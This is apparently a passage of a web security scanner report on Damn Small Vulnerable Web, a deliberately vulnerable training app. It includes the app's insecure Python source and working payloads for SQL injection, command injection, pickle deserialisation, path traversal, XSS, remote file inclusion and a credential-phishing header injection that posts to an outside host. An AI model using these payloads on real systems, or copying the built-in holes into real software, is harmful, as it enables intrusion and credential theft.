Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:12:34 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12732 bytes) 
          <!DOCTYPE html>
<html>
<head>
<style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style>
<title>Damn Small Vulnerable Web (DSVW) &lt; 100 LoC (Lines of Code)</title>
</head>
<body style='font: 12px monospace'>
<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));}; var index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div style="position: absolute; top: 5px; right: 5px;">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>');</script>

        4. GET http://127.0.0.1:65412/?comment=
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

          The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));};", see evidence field for the suspicious comment/snippet.

<div><span>Attacks:</span></div>
<ul>
<li>Blind SQL Injection (<i>boolean</i>) - <a href="?id=2">vulnerable</a>|<a href="/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27" onclick="alert('checking if the first character for admin\'s password is digit \'7\' (true in case of same result(s) as for \'vulnerable\')')">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique" target="_blank">info</a></li>
<li>Blind SQL Injection (<i>time</i>) - <a href="?id=2">vulnerable</a>|<a href="/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))" onclick="alert('checking if the second character for admin\'s password is letter \'e\' (true in case of delayed response)')">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#time-delay-exploitation-technique" target="_blank">info</a></li>

        9. GET http://127.0.0.1:65412/?id=(SELECT%20(CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C2%2C1)%3D%27e%27)%20THEN%20(LIKE(%27ABCDEFG%27%2CUPPER(HEX(RANDOMBLOB(300000000)))))%20ELSE%200%20END))
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

          The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));};", see evidence field for the suspicious comment/snippet.

          Evidence 
          from
          Solution

          Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.
        12. GET http://127.0.0.1:65412/?id=2%20UNION%20ALL%20SELECT%20NULL%2C%20NULL%2C%20NULL%2C%20(SELECT%20id%7C%7C%27%2C%27%7C%7Cusername%7C%7C%27%2C%27%7C%7Cpassword%20FROM%20users%20WHERE%20username%3D%27admin%27)
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

          The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));};", see evidence field for the suspicious comment/snippet.

          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03

        14. GET http://127.0.0.1:65412/?path=
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

          The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));};", see evidence field for the suspicious comment/snippet.

<div><span>Attacks:</span></div>
<ul>
<li>Blind SQL Injection (<i>boolean</i>) - <a href="?id=2">vulnerable</a>|<a href="/?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%277%27" onclick="alert('checking if the first character for admin\'s password is digit \'7\' (true in case of same result(s) as for \'vulnerable\')')">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection#boolean-exploitation-technique" target="_blank">info</a></li>

</body>
</html>
          Evidence 
          from
          Solution

          Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.
        15. GET http://127.0.0.1:65412/?path=dsvw.py
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

          The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>function process(data) {alert(\"Surname(s) from JSON results: \" + Object.keys(data).map(function(k) {return data[k]}));", see evidence field for the suspicious comment/snippet.
          Request
          Request line and header section (388 bytes) 
          GET http://127.0.0.1:65412/?path=dsvw.py HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/?path=
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (172 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:12:13 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/plain; charset=utf8
          Response body (19978 bytes) 
          #!/usr/bin/env python
import html, http.client, http.server, io, json, os, pickle, random, re, socket, socketserver, sqlite3, string, sys, subprocess, time, traceback, urllib.parse, urllib.request, xml.etree.ElementTree  # Python 3 required
try:
    import lxml.etree
except ImportError:
    print("[!] please install 'python-lxml' to (also) get access to XML vulnerabilities (e.g. '%s')\n" % ("apt-get install python-lxml" if os.name != "nt" else "https://pypi.python.org/pypi/lxml"))

NAME, VERSION, GITHUB, AUTHOR, LICENSE = "Damn Small Vulnerable Web (DSVW) < 100 LoC (Lines of Code)", "0.2b", "https://github.com/stamparm/DSVW", "Miroslav Stampar (@stamparm)", "Unlicense (public domain)"
LISTEN_ADDRESS, LISTEN_PORT = "127.0.0.1", 65412
HTML_PREFIX, HTML_POSTFIX = "<!DOCTYPE html>\n<html>\n<head>\n<style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style>\n<title>%s</title>\n</head>\n<body style='font: 12px monospace'>\n<script>function process(data) {alert(\"Surname(s) from JSON results: \" + Object.keys(data).map(function(k) {return data[k]}));}; var index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div style=\"position: absolute; top: 5px; right: 5px;\">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>');</script>\n" % html.escape(NAME), "<div style=\"position: fixed; bottom: 5px; text-align: center; width: 100%%;\">Powered by <a href=\"%s\" style=\"font-weight: bold; text-decoration: none; visited: blue; color: blue\" target=\"_blank\">%s</a> (v<b>%s</b>)</div>\n</body>\n</html>" % (GITHUB, re.search(r"\(([^)]+)", NAME).group(1), VERSION)
USERS_XML = """<?xml version="1.0" encoding="utf-8"?><users><user id="0"><username>admin</username><name>admin</name><surname>admin</surname><password>7en8aiDoh!</password></user><user id="1"><username>dricci</username><name>dian</name><surname>ricci</surname><password>12345</password></user><user id="2"><username>amason</username><name>anthony</name><surname>mason</surname><password>gandalf</password></user><user id="3"><username>svargas</username><name>sandra</name><surname>vargas</surname><password>phest1945</password></user></users>"""

"/?path=foobar", "https://owasp.org/www-community/attacks/Full_Path_Disclosure"), ("Source Code Disclosure", "/?path=", "/?path=dsvw.py", (<i>phishing</i>)", "/?charset=utf8", "/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E", 127.0.0.1" if os.name != "nt" else "ping -n 5 127.0.0.1"), "https://www.cs.uic.edu/~s/musings/pickle.html"), ("Denial of Service (<i>memory</i>)", "/?size=32", "/?size=9999999", "https://owasp.org/www-community/attacks/Denial_of_Service"))

def init():
    global connection
    http.server.HTTPServer.allow_reuse_address = True
    connection = sqlite3.connect(":memory:", isolation_level=None, check_same_thread=False)
    cursor = connection.cursor()
    cursor.execute("CREATE TABLE users(id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, name TEXT, surname TEXT, password TEXT)")
    cursor.executemany("INSERT INTO users(id, username, name, surname, password) VALUES(NULL, ?, ?, ?, ?)", ((_.findtext("username"), _.findtext("name"), _.findtext("surname"), _.findtext("password")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall("user")))
    cursor.execute("CREATE TABLE comments(id INTEGER PRIMARY KEY AUTOINCREMENT, comment TEXT, time TEXT)")

class ReqHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path, query = self.path.split('?', 1) if '?' in self.path else (self.path, "")
        code, content, params, cursor = http.client.OK, HTML_PREFIX, dict((match.group("parameter"), urllib.parse.unquote(','.join(re.findall(r"(?:\A|[?&])%s=([^&]+)" % match.group("parameter"), query)))) for match in re.finditer(r"((\A|[?&])(?P<parameter>[\w\[\]]+)=)([^&]+)", query)), connection.cursor()
        try:
            if path == '/':
                if "id" in params:
                    cursor.execute("SELECT id, username, name, surname FROM users WHERE id=" + params["id"])
                    content += "<div><span>Result(s):</span></div><table><thead><th>id</th><th>username</th><th>name</th><th>surname</th></thead>%s</table>%s" % ("".join("<tr>%s</tr>" % "".join("<td>%s</td>" % ("-" if _ is None else _) for _ in row) for row in cursor.fetchall()), HTML_POSTFIX)
                elif "v" in params:
                    content += re.sub(r"(v<b>)[^<]+(</b>)", r"\g<1>%s\g<2>" % params["v"], HTML_POSTFIX)
                elif "object" in params:
                    content = str(pickle.loads(params["object"].encode()))
                elif "path" in params:
                    content = (open(os.path.abspath(params["path"]), "rb") if not "://" in params["path"] else urllib.request.urlopen(params["path"])).read().decode()
                elif "domain" in params:
                    content = subprocess.check_output("nslookup " + params["domain"], shell=True, stderr=subprocess.STDOUT, stdin=subprocess.PIPE).decode()
                elif "xml" in params:
                    content = lxml.etree.tostring(lxml.etree.parse(io.BytesIO(params["xml"].encode()), lxml.etree.XMLParser(no_network=False)), pretty_print=True).decode()
                elif "name" in params:
                    found = lxml.etree.parse(io.BytesIO(USERS_XML.encode())).xpath(".//user[name/text()='%s']" % params["name"])
                    content += "<b>Surname:</b> %s%s" % (found[-1].find("surname").text if found else "-", HTML_POSTFIX)
                elif "size" in params:
                    start, _ = time.time(), "<br>".join("#" * int(params["size"]) for _ in range(int(params["size"])))
                    content += "<b>Time required</b> (to 'resize image' to %dx%d): %.6f seconds%s" % (int(params["size"]), int(params["size"]), time.time() - start, HTML_POSTFIX)
                elif "comment" in params or query == "comment=":
                    if "comment" in params:
                        cursor.execute("INSERT INTO comments VALUES(NULL, '%s', '%s')" % (params["comment"], time.ctime()))
                        content += "Thank you for leaving the comment. Please click here <a href=\"/?comment=\">here</a> to see all comments%s" % HTML_POSTFIX
                    else:
                        cursor.execute("SELECT id, comment, time FROM comments")
                        content += "<div><span>Comment(s):</span></div><table><thead><th>id</th><th>comment</th><th>time</th></thead>%s</table>%s" % ("".join("<tr>%s</tr>" % "".join("<td>%s</td>" % ("-" if _ is None else _) for _ in row) for row in cursor.fetchall()), HTML_POSTFIX)
                elif "include" in params:
                    backup, sys.stdout, program, envs = sys.stdout, io.StringIO(), (open(params["include"], "rb") if not "://" in params["include"] else urllib.request.urlopen(params["include"])).read(), {"DOCUMENT_ROOT": os.getcwd(), "HTTP_USER_AGENT": self.headers.get("User-Agent"), "REMOTE_ADDR": self.client_address[0], "REMOTE_PORT": self.client_address[1], "PATH": path, "QUERY_STRING": query}
                    exec(program, envs)
                    content += sys.stdout.getvalue()
                    sys.stdout = backup
                elif "redir" in params:
                    content = content.replace("<head>", "<head><meta http-equiv=\"refresh\" content=\"0; url=%s\"/>" % params["redir"])
                if HTML_PREFIX in content and HTML_POSTFIX not in content:
                    content += "<div><span>Attacks:</span></div>\n<ul>%s\n</ul>\n" % ("".join("\n<li%s>%s - <a href=\"%s\">vulnerable</a>|<a href=\"%s\">exploit</a>|<a href=\"%s\" target=\"_blank\">info</a></li>" % (" class=\"disabled\" title=\"module 'python-lxml' not installed\"" if ("lxml.etree" not in sys.modules and any(_ in case[0].upper() for _ in ("XML", "XPATH"))) else "", case[0], case[1], case[2], case[3]) for case in CASES)).replace("<a href=\"None\">vulnerable</a>|", "<b>-</b>|")
            elif path == "/users.json":
                content = "%s%s%s" % ("" if not "callback" in params else "%s(" % params["callback"], json.dumps(dict((_.findtext("username"), _.findtext("surname")) for _ in xml.etree.ElementTree.fromstring(USERS_XML).findall("user"))), "" if not "callback" in params else ")")
            elif path == "/login":
                cursor.execute("SELECT * FROM users WHERE username='" + re.sub(r"[^\w]", "", params.get("username", "")) + "' AND password='" + params.get("password", "") + "'")
                content += "Welcome <b>%s</b><meta http-equiv=\"Set-Cookie\" content=\"SESSIONID=%s; path=/\"><meta http-equiv=\"refresh\" content=\"1; url=/\"/>" % (re.sub(r"[^\w]", "", params.get("username", "")), "".join(random.sample(string.ascii_letters + string.digits, 20))) if cursor.fetchall() else "The username and/or password is incorrect<meta http-equiv=\"Set-Cookie\" content=\"SESSIONID=; path=/; expires=Thu, 01 Jan 1970 00:00:00 GMT\">"
            else:
                code = http.client.NOT_FOUND
        except Exception as ex:
            content = ex.output if isinstance(ex, subprocess.CalledProcessError) else traceback.format_exc()
            code = http.client.INTERNAL_SERVER_ERROR
        finally:
            self.send_response(code)
            self.send_header("Connection", "close")
            self.send_header("X-XSS-Protection", "0")
            self.send_header("Content-Type", "%s%s" % ("text/html" if content.startswith("<!DOCTYPE html>") else "text/plain", "; charset=%s" % params.get("charset", "utf8")))
            self.end_headers()
            self.wfile.write(("%s%s" % (content, HTML_POSTFIX if HTML_PREFIX in content and GITHUB not in content else "")).encode())
            self.wfile.flush()

class ThreadingServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
    def server_bind(self):
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        http.server.HTTPServer.server_bind(self)

if __name__ == "__main__":
    init()
    print("%s #v%s\n by: %s\n\n[i] running HTTP server at 'http://%s:%d'..." % (NAME, VERSION, AUTHOR, LISTEN_ADDRESS, LISTEN_PORT))
    try:
        ThreadingServer((LISTEN_ADDRESS, LISTEN_PORT), ReqHandler).serve_forever()
    except KeyboardInterrupt:
        pass
    except Exception as ex:
        print("[x] exception occurred ('%s')" % ex)
    finally:
        os._exit(0)
          Evidence 
          from
          Solution

          Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.
        16. GET http://127.0.0.1:65412/?redir=
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

          The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));};", see evidence field for the suspicious comment/snippet.

          Request line and header section (376 bytes) 
          GET http://127.0.0.1:65412/?redir= HTTP/1.1

Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/

          Request body (0 bytes)

          Status line and header section (171 bytes)

        17. GET http://127.0.0.1:65412/?redir=http%3A%2F%2Fdsvw.c1.biz
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

          The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));};", see evidence field for the suspicious comment/snippet.

          Evidence 
          from
          Solution

          Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.
        20. GET http://127.0.0.1:65412/?v=0.2
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

          The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));};", see evidence field for the suspicious comment/snippet.
          Request
          Request line and header section (375 bytes) 
          GET http://127.0.0.1:65412/?v=0.2 HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:10:34 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12731 bytes) 
          <!DOCTYPE html>
<html>
<head>
<style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style>
<title>Damn Small Vulnerable Web (DSVW) &lt; 100 LoC (Lines of Code)</title>
</head>
<body style='font: 12px monospace'>
<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));}; var index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div style="position: absolute; top: 5px; right: 5px;">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>');</script>
<div style="position: fixed; bottom: 5px; text-align: center; width: 100%;">Powered by <a href="https://github.com/stamparm/DSVW" style="font-weight: bold; text-decoration: none; visited: blue; color: blue" target="_blank">DSVW</a> (v<b>0.2</b>)</div>
</body>
</html><div><span>Attacks:</span></div>

          Evidence 
          from
          Solution

          Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.
        21. GET http://127.0.0.1:65412/?v=0.2%3Cdiv%20style%3D%22opacity%3A0%3Bfilter%3Aalpha(opacity%3D20)%3Bbackground-color%3A%23000%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20onclick%3D%22document.location%3D%27http%3A%2F%2Fdsvw.c1.biz%2F%27%22%3E%3C%2Fdiv%3E%3Cscript%3Ealert(%22click%20anywhere%20on%20page%22)%3B%3C%2Fscript%3E
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

          The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));};", see evidence field for the suspicious comment/snippet.

        22. GET http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2F%22%20style%3D%22background-color%3Awhite%3Bwidth%3A100%25%3Bheight%3A100%25%3Bz-index%3A10%3Btop%3A0%3Bleft%3A0%3Bposition%3Afixed%3B%22%20frameborder%3D%220%22%3E%3C%2Fiframe%3E

          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.

          Evidence 
          from
          Solution

          Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.
        23. GET http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

          The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));};", see evidence field for the suspicious comment/snippet.
          Request
          Request line and header section (626 bytes) 
          GET http://127.0.0.1:65412/?v=0.2%3Ciframe%20src%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flogin.html%22%20style%3D%22background-color%3Awhite%3Bz-index%3A10%3Btop%3A10%25%3Bleft%3A10%25%3Bposition%3Afixed%3Bborder-collapse%3Acollapse%3Bborder%3A1px%20solid%20%23a8a8a8%22%3E%3C%2Fiframe%3E HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10

          Response body (12910 bytes)

          Evidence 
          from
          Solution

          Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.
        24. GET http://127.0.0.1:65412/?v=0.2%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

          The following pattern was used: \bFROM\b and was detected in the element starting with: "<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));};", see evidence field for the suspicious comment/snippet.
          Request
          Request line and header section (437 bytes) 
          GET http://127.0.0.1:65412/?v=0.2%3Cscript%3Ealert(%22arbitrary%20javascript%22)%3C%2Fscript%3E HTTP/1.1
Host: 127.0.0.1:65412
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Connection: keep-alive
Referer: http://127.0.0.1:65412/
Upgrade-Insecure-Requests: 1
          Request body (0 bytes)
          Response
          Status line and header section (171 bytes) 
          HTTP/1.0 200 OK
Server: BaseHTTP/0.6 Python/3.8.10
Date: Thu, 13 Jan 2022 19:10:37 GMT
Connection: close
X-XSS-Protection: 0
Content-Type: text/html; charset=utf8
          Response body (12777 bytes) 
          <!DOCTYPE html>
<html>
<head>
<style>a {font-weight: bold; text-decoration: none; visited: blue; color: blue;} ul {display: inline-block;} .disabled {text-decoration: line-through; color: gray} .disabled a {visited: gray; color: gray; pointer-events: none; cursor: default} table {border-collapse: collapse; margin: 12px; border: 2px solid black} th, td {border: 1px solid black; padding: 3px} span {font-size: larger; font-weight: bold}</style>
<title>Damn Small Vulnerable Web (DSVW) &lt; 100 LoC (Lines of Code)</title>
</head>
<body style='font: 12px monospace'>
<script>function process(data) {alert("Surname(s) from JSON results: " + Object.keys(data).map(function(k) {return data[k]}));}; var index=document.location.hash.indexOf('lang='); if (index != -1) document.write('<div style="position: absolute; top: 5px; right: 5px;">Chosen language: <b>' + decodeURIComponent(document.location.hash.substring(index + 5)) + '</b></div>');</script>
<div style="position: fixed; bottom: 5px; text-align: center; width: 100%;">Powered by <a href="https://github.com/stamparm/DSVW" style="font-weight: bold; text-decoration: none; visited: blue; color: blue" target="_blank">DSVW</a> (v<b>0.2<script>alert("arbitrary javascript")</script></b>)</div>
</body>
</html><div><span>Attacks:</span></div>

<li>Arbitrary Code Execution - <a href="/?domain=www.google.com">vulnerable</a>|<a href="/?domain=www.google.com%26%20ipconfig">exploit</a>|<a href="https://en.wikipedia.org/wiki/Arbitrary_code_execution" target="_blank">info</a></li>
<li>Full Path Disclosure - <a href="/?path=">vulnerable</a>|<a href="/?path=foobar">exploit</a>|<a href="https://owasp.org/www-community/attacks/Full_Path_Disclosure" target="_blank">info</a></li>
<li>Source Code Disclosure - <a href="/?path=">vulnerable</a>|<a href="/?path=dsvw.py">exploit</a>|<a href="https://www.imperva.com/resources/glossary?term=source_code_disclosure" target="_blank">info</a></li>
<li>Path Traversal - <a href="/?path=">vulnerable</a>|<a href="/?path=..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini">exploit</a>|<a href="https://www.owasp.org/index.php/Path_Traversal" target="_blank">info</a></li>
<li>File Inclusion (<i>remote</i>) - <a href="/?include=">vulnerable</a>|<a href="/?include=http%3A%2F%2Fpastebin.com%2Fraw.php%3Fi%3D6VyyNNhc&amp;cmd=ipconfig">exploit</a>|<a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion" target="_blank">info</a></li>
<li>HTTP Header Injection (<i>phishing</i>) - <a href="/?charset=utf8">vulnerable</a>|<a href="/?charset=utf8%0D%0AX-XSS-Protection:0%0D%0AContent-Length:388%0D%0A%0D%0A%3C!DOCTYPE%20html%3E%3Chtml%3E%3Chead%3E%3Ctitle%3ELogin%3C%2Ftitle%3E%3C%2Fhead%3E%3Cbody%20style%3D%27font%3A%2012px%20monospace%27%3E%3Cform%20action%3D%22http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.php%22%20onSubmit%3D%22alert(%27visit%20%5C%27http%3A%2F%2Fdsvw.c1.biz%2Fi%2Flog.txt%5C%27%20to%20see%20your%20phished%20credentials%27)%22%3EUsername%3A%3Cbr%3E%3Cinput%20type%3D%22text%22%20name%3D%22username%22%3E%3Cbr%3EPassword%3A%3Cbr%3E%3Cinput%20type%3D%22password%22%20name%3D%22password%22%3E%3Cinput%20type%3D%22submit%22%20value%3D%22Login%22%3E%3C%2Fform%3E%3C%2Fbody%3E%3C%2Fhtml%3E">exploit</a>|<a href="https://www.rapid7.com/db/vulnerabilities/http-generic-script-header-injection" target="_blank">info</a></li>
<li>Component with Known Vulnerability (<i>pickle</i>) - <a href="/?object=%80%04%95t%00%00%00%00%00%00%00%7D%94%28%8C%05admin%94%8C%05admin%94%8C%05admin%94%86%94%8C%06dricci%94%8C%04dian%94%8C%05ricci%94%86%94%8C%06amason%94%8C%07anthony%94%8C%05mason%94%86%94%8C%07svargas%94%8C%06sandra%94%8C%06vargas%94%86%94u.">vulnerable</a>|<a href="/?object=cos%0Asystem%0A(S%27ping%20-n%205%20127.0.0.1%27%0AtR.%0A" onclick="alert('checking if arbitrary code can be executed remotely (true in case of delayed response)')">exploit</a>|<a href="https://www.cs.uic.edu/~s/musings/pickle.html" target="_blank">info</a></li>
<li>Denial of Service (<i>memory</i>) - <a href="/?size=32">vulnerable</a>|<a href="/?size=9999999">exploit</a>|<a href="https://owasp.org/www-community/attacks/Denial_of_Service" target="_blank">info</a></li>
</ul>
          Evidence 
          from
          Solution

          Remove all comments that return information that may help an attacker and fix any underlying problems they refer to.
        25. GET http://127.0.0.1:65412/favicon.ico
          Alert tags
          • OWASP_2021_A01
          • OWASP_2017_A03
          Alert description

          The response appears to contain suspicious comments which may help an attacker. Note: Matches made within script blocks or files are against the entire content not only comments.
          Other info

